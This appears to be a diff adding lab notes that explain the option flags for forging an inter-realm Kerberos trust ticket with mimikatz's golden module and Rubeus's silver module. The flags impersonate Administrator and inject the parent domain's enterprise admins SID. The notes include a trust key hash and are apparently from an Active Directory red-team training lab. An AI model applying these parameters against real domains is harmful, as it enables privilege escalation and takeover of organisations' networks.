@@ -1,0 +1,19 @@
+Options:
+  Kerberos::golden                       The mimikatz module
+  /domain:dollarcorp.moneycorp.local     FQDN of the current domain
+  /sid:S-1-5-21-<SNIP>                   SID of the current domain
+  /sids:S-1-5-21-<SNIP>                  SID of the enterprise admins group of the parent domain
+  /rc4:e9ab2e57f6397c19b62476e98e9521ac  RC4 of the trust key
+  /user:Administrator                    User to impersonate
+  /service:krbtgt                        Target service in the parent domain
+  /target:moneycorp.local                FQDN of the parent domain
+  /ticket:C:\AD\Tools\trust_tkt.kirbi    Path where ticket is to be saved
+
+Rubeus Options:
+  silver                                 Name of the module
+  /rc4:17e8f4d3f4b46e95048a<SNIP>        NTLM hash of the trust key
+  /sid:S-1-5-21-719815819-<SNIP>         SID of the current domain
+  /sids:S-1-5-21-335606122-<SNIP>        SID of the enterprise admins group of the parent domain
+  /ldap                                  Retrieve PAC information from the current domain DC
+  /user:Administrator                    Username for which the TGT is generated
+  /nowrap                                No newlines in the output
